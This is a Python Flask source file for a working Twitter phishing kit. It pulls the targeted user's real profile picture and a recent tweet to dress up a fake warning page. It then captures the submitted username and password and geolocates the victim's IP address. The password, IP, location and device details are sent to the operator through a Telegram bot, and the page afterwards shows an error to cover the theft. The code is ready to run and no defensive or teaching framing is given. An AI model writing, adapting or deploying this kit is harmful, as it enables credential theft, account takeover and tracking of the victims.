


import json
import os
import time
import random
import requests
import telebot
import tweepy
from flask import Flask, request, render_template

# Load or Prompt for User Credentials
def load_credentials():
    config_file = "config.json"
    if os.path.exists(config_file):
        with open(config_file, "r") as f:
            return json.load(f)
    else:
        print("🔐 Enter your API credentials:")
        creds = {
            "TELEGRAM_TOKEN": input("Telegram Bot Token: "),
            "CHAT_ID": input("Telegram Chat ID: "),
            "BEARER_TOKEN": input("Twitter Bearer Token: ")
        }
        with open(config_file, "w") as f:
            json.dump(creds, f)
        return creds

# Load user credentials
creds = load_credentials()
TELEGRAM_TOKEN = creds["TELEGRAM_TOKEN"]
CHAT_ID = creds["CHAT_ID"]
BEARER_TOKEN = creds["BEARER_TOKEN"]

# Initialize services
app = Flask(__name__, static_folder='static')
bot = telebot.TeleBot(TELEGRAM_TOKEN)
client = tweepy.Client(bearer_token=BEARER_TOKEN)

tweet_cache = {}
profile_cache = {}
CACHE_EXPIRY = 3000  # 50 minutes

# Fetch Twitter Data
def get_user_data(username):
    current_time = time.time()
    if username in tweet_cache and (current_time - tweet_cache[username]['timestamp'] < CACHE_EXPIRY):
        return tweet_cache[username]['tweet'], profile_cache[username]
    try:
        user = client.get_user(username=username, user_fields=["profile_image_url"])
        user_id = user.data.id
        profile_pic = user.data.profile_image_url.replace("_normal", "")
        tweets = client.get_users_tweets(id=user_id, max_results=5)
        tweet_text = random.choice([tweet.text for tweet in tweets.data]) if tweets.data else "No tweets available."
        tweet_cache[username] = {"tweet": tweet_text, "timestamp": current_time}
        profile_cache[username] = profile_pic
        return tweet_text, profile_pic
    except:
        return "Error fetching tweets.", "/static/default_profile.jpg"

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        tweet, profile_pic = get_user_data(username)
        return render_template('twitter_warning.html', username=username, tweet=tweet, profile_pic=profile_pic)
    return render_template('twitter_username_prompt.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    ip_address = request.remote_addr
    try:
        geo_data = requests.get(f'http://ip-api.com/json/{ip_address}').json()
        location_info = f"{geo_data.get('city')}, {geo_data.get('regionName')}, {geo_data.get('country')}"
    except:
        location_info = "Unknown location"
    user_agent = request.headers.get('User-Agent', 'N/A')
    message = (f"🔒 **Phishing Alert!**\n"
               f"👤 **Username:** {username}\n"
               f"🔑 **Password:** {password}\n"
               f"🌍 **IP:** {ip_address}\n"
               f"📍 **Location:** {location_info}\n"
               f"🖥️ **Device:** {user_agent}")
    bot.send_message(CHAT_ID, message)
    return render_template('error.html')

if __name__ == '__main__':
    app.run(debug=True)